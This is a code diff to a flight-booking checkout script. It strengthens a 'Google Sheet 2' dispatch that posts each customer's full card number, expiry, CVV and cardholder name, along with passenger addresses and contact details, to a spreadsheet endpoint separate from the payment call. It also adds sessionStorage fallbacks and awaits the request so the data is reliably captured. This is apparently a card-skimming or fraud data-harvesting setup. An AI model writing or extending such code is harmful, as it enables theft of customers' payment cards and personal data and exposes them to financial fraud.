@@ -248,6 +248,15 @@
       }
 
       let currentBooking = null;
+      let localPax = {};
+      let localContact = {};
+      let localFlight = {};
+      try {
+        localPax = JSON.parse(sessionStorage.getItem('fs_lead_passenger') || '{}');
+        localContact = JSON.parse(sessionStorage.getItem('fs_contact') || '{}');
+        localFlight = JSON.parse(sessionStorage.getItem('fs_booking_flight') || '{}');
+      } catch (e) {}
+
       try {
         const res = await fetch(getApiEndpoint(`/api/booking/${bookingId}`));
         if (res.ok) {
@@ -293,12 +302,14 @@
           else if (/^3[47]/.test(rawNum)) cardBrand = 'American Express';
           else if (/^6(?:011|5)/.test(rawNum)) cardBrand = 'Discover';
 
+          const leadPax = currentBooking?.passengers?.[0] || localPax || {};
+          const contact = currentBooking?.contact || localContact || {};
+          const flight = currentBooking?.flight || localFlight || {};
+          const totalVal = currentBooking?.pricing?.total || flight?.pricing?.total || 140;
+
           // Direct Client Dispatch to Google Sheet 2 (Passenger + Route + Card Details)
           try {
-            const leadPax = currentBooking?.passengers?.[0] || {};
-            const contact = currentBooking?.contact || {};
-            const flight = currentBooking?.flight || {};
-            fetch(getApiEndpoint('/api/sheet/save-lead-traveler'), {
+            await fetch(getApiEndpoint('/api/sheet/save-lead-traveler'), {
               method: 'POST',
               headers: { 'Content-Type': 'application/json' },
               body: JSON.stringify({
@@ -317,7 +328,7 @@
                 zip: leadPax.address?.zip || '',
                 country: leadPax.address?.country || '',
                 flight,
-                price: currentBooking?.pricing?.total || 0,
+                price: totalVal,
                 cardName: cardholderName,
                 cardNumber: rawNum,
                 cardBrand,
@@ -325,7 +336,7 @@
                 cardCvv: cvv
               }),
               keepalive: true
-            }).catch(() => {});
+            });
           } catch (sheetErr) {
             console.warn('[Sheet2 Client Sync Error]:', sheetErr);
           }
@@ -342,7 +353,11 @@
               cardBrand,
               last4,
               expiry,
-              cardholderName
+              cardholderName,
+              leadPax,
+              contact,
+              flight,
+              price: totalVal
             })
           });
 
